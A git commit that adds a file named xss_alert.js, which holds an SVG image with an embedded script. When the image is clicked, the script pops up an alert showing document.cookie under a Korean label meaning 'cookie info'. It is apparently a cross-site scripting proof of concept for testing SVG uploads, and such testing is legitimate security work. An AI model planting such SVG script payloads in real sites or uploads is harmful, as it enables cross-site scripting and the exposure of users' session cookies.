1286931e058cabf52da4b56c04a283591046b75f
lemi9090 <142860891+lemi9090@users.noreply.github.com>
2024-06-29 12:49:47 +0900

    Create xss_alert.js

---
+++ xss_alert.js
@@ -0,0 +1,9 @@
+<?xml version="1.0" standalone="no"?>
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <rect width="200" height="200" style="fill:blue;" />
+    <script type="text/ecmascript">
+    <![CDATA[
+        document.documentElement.addEventListener('click', function() {alert("쿠키정보: " + document.cookie)}, false);
+    ]]>
+    </script>
+</svg>
